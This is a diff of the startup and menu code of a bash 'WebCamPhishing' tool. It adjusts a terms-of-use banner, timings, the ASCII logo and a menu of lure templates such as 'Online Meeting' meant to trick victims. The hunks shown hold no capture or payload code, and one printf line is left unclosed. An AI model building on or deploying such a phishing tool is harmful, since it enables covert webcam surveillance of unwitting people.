@@ -3,49 +3,50 @@
 # Powered by Justine Dela Torre (Jasutin)
 # Credits goes to thelinuxchoice [https://github.com/thelinuxchoice]
 
-trap 'printf "\n";stop' 3
+clear
+trap 'printf "\n";stop' 2
+
+startup() {
 clear
 
-printf "%*s\n\n\n\n\n\n"
-printf "\n\t\e[1;36mThese Terms of Use constitute a legally binding agreement made between you,\t\e[0m"
-printf "\n\t\e[1;36mwhether personally or on behalf of an entity 'You' and Prism Att&ck 'Company, we, us, or our'\t\e[0m"
-printf "\n\t\e[1;36mconcerning your access to use of the 'Repositories' https://github.com/jasut1n website as well as any other\t\e[0m"
-printf "\n\t\e[1;36mmedia form, media channel, mobile website or mobile application related, linked, or otherwise\t\e[0m"
-printf "\n\t\e[1;36mconnected there to 'Collectively, the Site'. You agree that by accessing the Site, you read\t\e[0m"
-printf "\n\t\e[1;36munderstood, and agreed to be bound by all these Terms of Use.\n\t\e[0m"
-printf "\n\t\e[1;36mIF YOU DO NOT AGREE WITH ALL THESE TERMS OF USE,\t\e[0m"
-printf "\n\t\e[1;36mTHEN YOU ARE EXPRESSLY PROHIBITED FROM USING THE 'SITE | FRAMEWORK' AND YOU MUST DISCONTINUE USE IMMEDIATELY.\t\e[0m"
+printf "\e[1;36mThese Terms of Use constitute a legally binding agreement made between you,\e[0m"
+printf "\e[1;36mwhether personally or on behalf of an entity 'You' and Prism Att&ck 'Company, we, us, or our'\e[0m"
+printf "\e[1;36mconcerning your access to use of the 'Repositories' https://github.com/jasut1n website as well as any other\e[0m"
+printf "\e[1;36mmedia form, media channel, mobile website or mobile application related, linked, or otherwise\e[0m"
+printf "\e[1;36mconnected there to 'Collectively, the Site'. You agree that by accessing the Site, you read\e[0m"
+printf "\e[1;36munderstood, and agreed to be bound by all these Terms of Use.\e[0m"
+printf "\e[1;36mIF YOU DO NOT AGREE WITH ALL THESE TERMS OF USE,\e[0m"
+printf "\e[1;36mTHEN YOU ARE EXPRESSLY PROHIBITED FROM USING THE 'SITE | FRAMEWORK' AND YOU MUST DISCONTINUE USE IMMEDIATELY.\e[0m"
+
+printf "\n"
+
+}
+
+clear
+
+printf "\n\t\t\t\t\t\e[1;31mHello $USER, You're currently using $SHELL\n\e[0m"
+
 
 printf "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t"
 
-echo "Ctrl + Z to disagree"
-
-sleep 10
-
-trap 'printf "\n";stop' 2
-clear
-
-printf "\e[1;96mTerms of Use | $RANDOM \e[0m"
-
-	printf "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\e[1;31mHello $USER, You're currently using $SHELL\n\e[0m"
+printf "Ctrl + Z to disagree
 
 sleep 5
 
-trap 'printf "\n";stop' 2
 clear
 
-printf "%*s\n\t\e[1;32mFramework loading, Might take a while...\e[0m"
+printf "%*s\n\t\t\t\t\t\e[1;32mFramework loading, Might take a while...\e[0m"
 
-sleep 5
+sleep 2
 
-trap 'printf "\n";stop' 2
 clear
 
-printf "\n\t\e[1;32mSTARTING...\e[1;32m"
+printf "\n\n\n\t\e[1;32mSTARTING...\e[0m"
 
-sleep 3
+sleep 2
 
 trap 'printf "\n";stop' 2
+
 banner() {
 clear
 
@@ -58,8 +59,8 @@ printf "\e[1;92m   \  \/  \/  /   |  ____|  |  _  / \e[1;34m| | ||   |  ___  || 
 printf "\e[1;92m    \        /    |  |      | |_) \ \e[1;34m| | || \ | (   ) || |   | |\e[0m\e[1;31m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m     \__/\__/     |  |_____ |_____/ \e[1;34m| (_||_/\| )   ( || )   ( |\e[0m\e[1;31m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m                  |________|        \e[1;34m(_______/|/     \||/     \|\e[0m\e[1;31m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf "\n\e[1;92mWebCamPhishing Version 1.5 | [Beta] \e[0m"
-printf "\e[1;32mPowered by Justine Dela Torre (Jasutin) \e[0m \n"
+printf "\n\e[1;92mWebCamPhishing Version 1.5 | [Beta] \e[0m\n"
+printf "\e[1;32mPowered by Justine Dela Torre (Jasutin) \e[0m\n"
 
 printf "\n"
 
@@ -188,7 +189,7 @@ clear
 banner
 camphish
 else
-printf "\n\n-----Choose a template-----\n"    
+printf "\n\n-----Choose a template-----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
